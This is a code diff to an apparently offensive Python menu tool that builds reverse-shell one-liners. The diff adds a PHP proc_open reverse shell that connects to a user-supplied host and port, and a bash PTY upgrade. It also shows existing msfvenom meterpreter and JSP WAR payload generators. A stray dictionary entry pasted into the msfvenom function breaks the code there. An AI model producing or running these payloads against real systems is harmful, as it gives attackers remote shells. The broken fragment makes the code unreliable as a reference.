@@ -67,8 +67,9 @@ def menu1():
     print "27. Perl Oneliner"
     print "28. Python Oneliner"
     print "29. PHP Oneliner"
-    print "30. Edit pentestmonkey's php file"
-    print "31. java/jsp_shell_reverse_tcp WAR file"
+    print "30. PHP Oneliner v2"
+    print "31. Edit pentestmonkey's php file"
+    print "32. java/jsp_shell_reverse_tcp WAR file"
     print "9. Back"
     print "0. Quit"
     choice = raw_input(" >>  ")
@@ -80,9 +81,10 @@ def menu1():
 def menu2():
     print "Which one do you want copied to clipboard\n"
     print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
-    print "11. echo os.system('/bin/bash')"
-    print "12. /bin/sh -i"
-    print "13. perl: exec \"/bin/sh\";"
+    print "11. python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    print "12. echo os.system('/bin/bash')"
+    print "13. /bin/sh -i"
+    print "14. perl: exec \"/bin/sh\";"
     print "9. Back"
     print "0. Quit" 
     choice = raw_input(" >>  ")
@@ -97,18 +99,13 @@ def back():
 def exit():
     sys.exit()
 
-# python menu
-def python():
-    os.system('clear')
-    print "Which one do you want to copy to clipboard"
-    print "10. python -c 'import pty; pty.spawn(\"/bin/sh\")'"
-    choice = raw_input(" >>  ")
-    exec_menu(choice)
-    return
-
 # python tty
 def python_tty():
     shellcode = 'python -c \'import pty; pty.spawn("/bin/sh")\''
+    oneliner(shellcode)
+
+def python_tty_v2():
+    shellcode = 'python -c \'import pty; pty.spawn("/bin/bash")\''
     oneliner(shellcode)
 
 #bash tty code	
@@ -176,6 +173,10 @@ def php_oneliner():
 	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
 	oneliner(shellcode)
 
+def php_oneliner_v2():
+    shellcode = 'php -r \'$sock = fsockopen("%s",%s); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); \'' % args
+    oneliner(shellcode)
+
 #PHP java/jsp_shell_reverse_tcp WAR 31
 def java_war():
     shellcode = "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war -o shell.war" % args
@@ -188,6 +189,7 @@ def java_war():
 def msfvenom(shellcode):
     warning ="Make sure you are using the correct payload in MSFConsole"
     os.system('clear')
+    '10': python_tty,
     print "Writing Shell"
     print shellcode
     os.system(shellcode)
@@ -224,11 +226,11 @@ menu_actions = {
 	'main_menu': main_menu,
     '1': menu1,
     '2': menu2,
-    '3': python,
     '10': python_tty,
-    '11': bash_tty,
-    '12': bin_tty,
-    '13': perl_tty,
+    '11': python_tty_v2,
+    '12': bash_tty,
+    '13': bin_tty,
+    '14': perl_tty,
     '20': linux_x86_meterpreter_reverse_tcp,
     '21': linux_x64_meterpreter_reverse_tcp,
     '22': windows_meterpreter_reverse_tcp,
@@ -239,8 +241,9 @@ menu_actions = {
     '27': perl_oneliner,
     '28': python_oneliner,
     '29': php_oneliner,
-    '30': php_file_pentestmonkey,
-    '31': java_war,
+    '30': php_oneliner_v2,
+    '31': php_file_pentestmonkey,
+    '32': java_war,
     '9': back,
     '0': exit,
 }
